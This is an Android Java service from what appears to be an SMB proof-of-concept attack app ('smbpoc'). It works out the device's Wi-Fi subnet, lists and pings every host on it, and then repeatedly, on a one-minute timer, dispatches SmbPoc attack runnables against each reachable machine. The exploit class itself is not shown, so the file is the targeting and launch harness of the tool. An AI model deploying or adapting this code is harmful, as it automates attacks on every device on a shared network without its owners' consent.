package info.lamatricexiste.smbpoc;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.ConcurrentModificationException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.DhcpInfo;
import android.net.wifi.WifiManager;
import android.os.DeadObjectException;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;
import android.util.Log;

public class Network extends Service
{
    private final   String          TAG             =  "NetworkService";
    public  final static String     ACTION_GETHOSTS =  "info.lamatricexiste.smbpoc.Network.uiThreadCallback.GETHOSTS";
    private final   int             TIMEOUT_REACH   =  1000;
    private final   int             SLEEP           =  125;
    private final   long            UPDATE_INTERVAL =  60000; //1mn
    private         WifiManager     wifi            =  null;
    private         DhcpInfo        dhcp            =  null;
    private         Timer           timer           =  new Timer();
    private         List<InetAddress> hosts         =  new ArrayList<InetAddress>();
    private         Handler         handler         =  null;
    private         InetAddress     ip_net          =  null;
    private         InetAddress     ip_bc           =  null;
    private         InetAddress     host_id         =  null;

    @Override
    public void onCreate()
    {
        super.onCreate();
        wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
        handler = new Handler(){
            @Override public void handleMessage(Message msg){
                Log.v(TAG, "handleMessage");
                sendBroadcast(new Intent(ACTION_GETHOSTS));
            }
        };
        
        dhcpInfo();
        //ip_bc = getIpByStr("10.0.2.255");
        //ip_net = getIpByStr("10.0.2.0");
        //host_id = getIpByStr("0.0.0.255");
    }

    @Override
    public void onDestroy() {
        stopService();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent){
        return mBinder;
    }

    private void startService(){
        timer.scheduleAtFixedRate(
            new TimerTask() {
                public void run() {
                    launchRequest();
                }
            }, 0, UPDATE_INTERVAL);
    }

    private void stopService(){
        if(timer!=null) timer.cancel();
    }
    
    private void onUpdate(){
        getAllHosts();
        checkHosts();
    }
    
/**
 * Runnable request
 */
    
    private void launchRequest(){
        if(wifi.isWifiEnabled()){
            for(InetAddress h : hosts){
                handler.postDelayed(getRunnable(h), SLEEP);
            }
            sendBroadcast(new Intent(ACTION_GETHOSTS));
        }
    }
    
    private Runnable getRunnable(InetAddress host){
        
        SmbPoc run = new SmbPoc();
        
        run.setHost(host);
        return (Runnable)run;
    }

/**
 * Interface binder
 */

    private final NetworkInterface.Stub mBinder = new NetworkInterface.Stub() {

        public void inSearchReachableHosts() throws DeadObjectException  {
            Log.v(TAG, "inSearchReachableHosts");
            onUpdate();
        }

        public List<String> inGetHosts() throws RemoteException {
            Log.v(TAG, "inGetHosts");
            return hostsToStr();
        }

        public void inSendPacket(boolean repeat) {
            Log.v(TAG, "inSendPacket");
            if(wifi.isWifiEnabled()){
                if(repeat){
                    startService();
                }
                else {
                    stopService();
                }
                launchRequest();
            }
        }

        public String inGetIp() throws DeadObjectException  {
            if(wifi.isWifiEnabled()){
                return getIp(dhcp.ipAddress).getHostAddress();
            }
            else {
                return "0.0.0.0";
            }
        }

        public String inGetIpNet() throws DeadObjectException  {
            if(wifi.isWifiEnabled()){
                return ip_net.getHostAddress();
            }
            else {
                return "0.0.0.0";
            }
        }

        public String inGetIpBc() throws DeadObjectException  {
            if(wifi.isWifiEnabled()){
                return ip_bc.getHostAddress();
            }
            else {
                return "0.0.0.0";
            }
        }

    };

/**
 * Network Logic
 */
    private void dhcpInfo(){
        if(wifi.isWifiEnabled()) {
            dhcp = wifi.getDhcpInfo();
            ip_bc = getBroadcastIP();
            ip_net = getNetIP();
            host_id = getHostId();
        }
    }

    private List<String> hostsToStr(){
        List<String> hosts_str = new ArrayList<String>();
        for(InetAddress h : hosts){
            hosts_str.add(h.getHostAddress());
        }
        return hosts_str;
    }
    
    private void checkHosts(){
        handler.post(
            new Runnable(){
                @Override public void run(){
                    if(wifi.isWifiEnabled()) {
                        List<InetAddress> hosts_new = new ArrayList<InetAddress>();
                        for(InetAddress h : hosts){
                            try {
                                if(h.isReachable(TIMEOUT_REACH)){
                                    hosts_new.add(h);
                                }
                            }
                            catch (ConcurrentModificationException e){
                                Log.e(TAG, "CheckHosts Concurrent Modification");
                            }
                            catch (IOException e) {
                                hosts_new.add(h);
                            }
                        }
                        hosts = hosts_new;
                        
                        // notify to update ui thread
                        handler.sendMessage(handler.obtainMessage());
                    }
                    handler.sendMessage(handler.obtainMessage());
                    Log.v(TAG, "checkHostsRunnable");
                }
            });
        Log.v(TAG, "CheckHosts");
    }
    
    private void getAllHosts(){
        if(wifi.isWifiEnabled()) {
            hosts = new ArrayList<InetAddress>();
            
            String ip_net_str = ip_net.getHostAddress();
            String[] ip_net_split = ip_net.getHostAddress().split("\\.");
            String[] ip_bc_split = ip_bc.getHostAddress().split("\\.");
        
            try {
                switch (host_id.hashCode()) {
              
                case 7:
                case 255:
                case 65535:
                case 16777215:
                  //    1.0.0.1 to 126.255.255.254 255.255.255.0
                    Integer start = Integer.parseInt(ip_net_split[(ip_net_split.length-1)])+1;
                    Integer end = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)])+1;
                    String ip_start = ip_net_str.substring(0, ip_net_str.lastIndexOf("."));
                    for(int i=start; i<end; i++){
                        hosts.add(InetAddress.getByName(ip_start+"."+i));
                    }
                    hosts.remove(getIp(dhcp.ipAddress));
                    break;
                  
        //      case 65535:
        //          // 128.1.0.1 to 191.255.255.254 255.255.0.0
        //          Integer s1 = Integer.parseInt(ip_net_split[(ip_net_split.length-2)]);
        //          Integer e1 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-2)]);
        //          Integer s2 = Integer.parseInt(ip_net_split[(ip_net_split.length-1)]);
        //          Integer e2 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)]);
        //          String ip1 = ip_net_str.substring(0, ip_net_str.indexOf(".", 4));
        //          for(int i=s1; i<=e1; i++){
        //              for(int j=s2; j<=e2; j++){
        //                  ip_host = InetAddress.getByName(ip1+"."+i+"."+j);
        //                  hosts.add(ip_host);
        //              }
        //          }
        ////          launchThreadAttack();
        //          break;
        //          
        //      case 16777215:
        //          // 192.0.1.1 to 223.255.254.254 255.0.0.0
        //          break;
                  
                }
            } catch (IOException e) {
                Log.e(TAG, e.getMessage());
            }
        }
    }
    
    private InetAddress getHostId(){
        int network = ~dhcp.netmask;
        return getIp(network);
    }

    private InetAddress getNetIP(){
        int network = (dhcp.ipAddress & dhcp.netmask);
        return getIp(network);
    }

    private InetAddress getBroadcastIP(){
        int broadcast = (dhcp.ipAddress & dhcp.netmask) | ~dhcp.netmask;
        return getIp(broadcast);
    }

    private InetAddress getIpByStr(String ip) {
        try {
            return InetAddress.getByName(ip);
        }
        catch (java.net.UnknownHostException e) {
            Log.e(TAG, e.getMessage());
            return null;
        }
    }
    
    private InetAddress getIp(int ip_int){
        byte[] quads = new byte[4];
        
        for (int k = 0; k < 4; k++)
            quads[k] = (byte) ((ip_int >> k * 8) & 0xFF);
        try {
            return InetAddress.getByAddress(quads);
        }
        catch (java.net.UnknownHostException e) {
            Log.e(TAG, e.getMessage());
            return null;
        }
    }

    private int getIpInt(InetAddress ip_addr) {
        String[] a = ip_addr.getHostAddress().split("\\.");
        return (
                Integer.parseInt(a[3])*16777216 + 
                Integer.parseInt(a[2])*65536 +
                Integer.parseInt(a[1])*256 +
                Integer.parseInt(a[0])
        );
    }
}
